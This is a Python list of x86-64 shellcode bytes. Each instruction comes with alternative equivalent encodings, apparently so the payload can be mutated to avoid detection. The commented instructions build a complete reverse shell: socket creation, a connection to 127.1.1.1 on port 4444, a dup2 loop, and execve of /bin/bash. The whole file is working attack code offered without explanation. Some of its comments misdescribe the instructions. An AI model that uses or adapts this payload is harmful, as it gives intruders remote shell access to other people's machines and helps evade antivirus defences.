permut_list = [
    [r"\x48\x31\xc0", r"\x48\x89\xc0", r"\x48\x29\xc0"], # XOR RAX
    [r"\x48\x31\xdb", r"\x48\x89\xdb", r"\x48\x29\xdb"], # XOR RBX
    [r"\x48\x31\xc9", r"\x48\x89\xc9", r"\x48\x29\xc9"], # XOR RCX
    [r"\x48\x31\xff", r"\x48\x89\xff", r"\x48\x29\xff"], # XOR RDI
    [r"\x48\x31\xd2", r"\x48\x89\xd2", r"\x48\x29\xd2", r"\x48\x31\xc0\x48\xc1\xe0\x40\x48\x89\xc2", r"\x48\x31\xc0\x48\x01\xd0\x48\x29\xc2"], # XOR RDX
    [r"\x48\x31\xf6"], # XOR RSI
    [r"\x48\xf7\xe6"], # MUL RSI
    [r"\x04\x29"],     # ADD AL, 0x29
    [r"\x48\xff\xc6"], # INC RSI
    [r"\x56"],         # PUSH RSI
    [r"\x5f"],         # POP RDI
    [r"\x48\xff\xc7"], # INC RDI
    [r"\x0f\x05"],     # SYSCALL
    [r"\x48\x97"],     # XCHG RAX, RDI
    [r"\x48\x31\xc0"], # XOR RAX
    [r"\x04\x2a"],     # ADD AL, 0x2a
    [r"\x52"],         # PUSH RDX
    [r"\x68\x7f\x01\x01\x01"], # PUSH 0x101017f
    [r"\x66\x68\x11\x5c"],     # PUSHW 0x5c11
    [r"\x48\xff\xc2"], # INC RDX
    [r"\x48\xff\xc2"], # INC RDX
    [r"\x66\x52"],     # PUSH DX
    [r"\x80\xc2\x0e"], # ADD DL, 0xe
    [r"\x48\x89\xe6"], # MOV RSP, RSI
    [r"\x0f\x05"],     # SYSCALL
    [r"\x48\x31\xf6"], # XOR RSI, RSI
    [r"\x31\xd2"],     # XOR EDX, EDX
    [r"\x80\xc2\x03"], # ADD DL, 0x3
    [""],
    [r"\x48\x31\xc0"], # XOR RAX
    [r"\x04\x21"],     # ADD AL, 0x21
    [r"\x0f\x05"],     # SYSCALL
    [r"\x48\xff\xc6"], # INC RSI
    [r"\x48\x39\xd6"], # CMP RDX, RSI
    [r"\x75\xf1"],     # JNE 0xf1 (40104a <dup2Loop>)
    [r"\x48\x31\xf6"], # XOR RSI, RSI
    [r"\x48\xf7\xe6"], # MUL RSI
    [r"\x48\x31\xff"], # XOR RDI, RDI
    [r"\x57"],         # PUSH RDI
    [r"\x48\x83\xc2\x68"],     # ADD RDX, 0x68
    [r"\x52"],         # PUSH RDX
    [r"\x48\xba\x2f\x62\x69\x6e\x2f\x62\x61\x73"], # MOVABS RDX, "/bin/bash\x00"
    [r"\x52"],         # PUSH RDX
    [r"\x48\x31\xd2"], # XOR RDX, RDX
    [r"\x48\x89\xe7"], # MOV RSP, RDI
    [r"\xb0\x3b"],     # MOV AL, 0x3b
    [r"\x0f\x05"],     # SYSCALL
    [r""],
]